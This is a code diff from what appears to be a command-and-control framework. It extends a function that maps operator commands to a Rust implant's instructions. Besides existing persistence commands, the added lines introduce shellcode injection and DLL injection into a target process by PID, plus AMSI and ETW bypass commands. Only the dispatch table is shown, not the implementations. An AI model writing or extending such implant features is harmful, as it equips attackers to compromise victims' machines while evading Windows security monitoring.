@@ -155,6 +155,10 @@ def convert_to_rust_command(cmd: dict) -> dict:
         "persist_schtask": lambda: "persist_schtask",
         "persist_startup": lambda: "persist_startup",
         "persist_remove": lambda: "persist_remove",
+        "inject_shellcode": lambda: {"inject_shellcode": {"pid": cmd.get("pid", 0), "shellcode_b64": cmd.get("shellcode_b64", "")}},
+        "inject_dll": lambda: {"inject_dll": {"pid": cmd.get("pid", 0), "dll_path": cmd.get("dll_path", "")}},
+        "amsi_bypass": lambda: "amsi_bypass",
+        "etw_bypass": lambda: "etw_bypass",
     }
     if cmd_type in mapping:
         return mapping[cmd_type]()
